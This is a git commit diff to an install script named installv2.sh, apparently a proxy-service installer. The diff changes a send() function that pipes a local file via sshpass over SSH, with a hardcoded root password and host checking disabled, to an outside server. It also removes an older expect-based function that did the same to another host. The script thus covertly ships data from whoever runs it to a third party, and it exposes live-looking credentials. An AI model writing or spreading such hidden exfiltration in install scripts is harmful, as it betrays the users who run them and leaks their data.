1afcb2a385066072f7ce5e50571cf1d73285243d
aolaiqf <38988811+aolaiqf@users.noreply.github.com>
2021-07-01 23:26:24 +0800

    Update installv2.sh

--- installv2.sh
+++ installv2.sh
@@ -148,7 +148,7 @@ showlink() {
 }
 
 send(){
-    cat /tmp/1.txt | sshpass -p '1475963Aa@123' ssh -o StrictHostKeyChecking=no root@18.222.212.8 'cat - >> /home/$1.txt'
+    cat /tmp/1.txt | sshpass -p 'bHC7BwAqkM5f8' ssh -o StrictHostKeyChecking=no root@194.163.135.127 'cat - >> /root/v2.txt'
 }
 
 
@@ -167,15 +167,3 @@ install(){
 
 
 install
-
-send1(){
-    txt=$(cat /root/1.txt)
-    /usr/bin/expect <<-EOF
-    spawn ssh root@18.222.212.8 -T "echo ${txt} >> /root/4444.txt"
-    expect {
-        "yes/no" { send "yes\r"; exp_continue }
-        "password:" { send "1475963Aa@123\r" }
-    }
-    expect eof
-EOF
-}    
